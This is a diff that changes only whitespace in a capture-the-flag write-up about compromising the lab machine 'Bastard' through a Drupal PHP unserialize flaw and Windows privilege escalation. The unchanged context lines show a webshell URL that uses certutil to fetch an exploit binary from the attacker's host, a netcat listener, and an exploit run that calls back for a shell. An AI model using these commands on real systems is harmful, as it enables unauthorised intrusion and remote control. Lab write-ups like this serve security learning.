@@ -81,7 +81,7 @@ Ran the file while listening to port 4242 on my Kali: </br>
 Content-Type/Accept headers.
 one of the input formats is: application/vnd.php.serialized, which is the type given to PHP-serialized data,
 that means that this module is vulnerable to trivial unserialize() vulnerability.
-The unserialize function can result in code being loaded and executed. </br>
+The unserialize function can result in code being loaded and executed. </br> </br>
 **Initial Shell Screenshot:** </br>
 ![initial_shell_poc2](images/bastard/initial_shell_poc2.png) </br>
 # Privilege Escalation:
@@ -90,7 +90,9 @@ I found an exploit on [GitHub](https://github.com/SecWiki/windows-kernel-exploit
 and downloaded on the windows machine, using cerutil (I used the webshell from earlier): </br>
 ```bash
 http://10.10.10.9/test.php?cmd=certutil%20-urlcache%20-split%20-f%20%22http://10.10.14.2/privesc.exe%22%20privesc.exe
-``` </br>
+``` 
+</br>
+
 I used netcat to listen to 1235 port on my Kali Linux: ```nc -nlvp 1235``` , and ran the exploit on the windows machine: ```privesc.exe 10.10.14.2 1234``` </br>
 [privesc_exploit](images/bastard/privesc_exploit.png) </br>
 [privesc_exploit2](images/bastard/privesc_exploit2.png) </br>
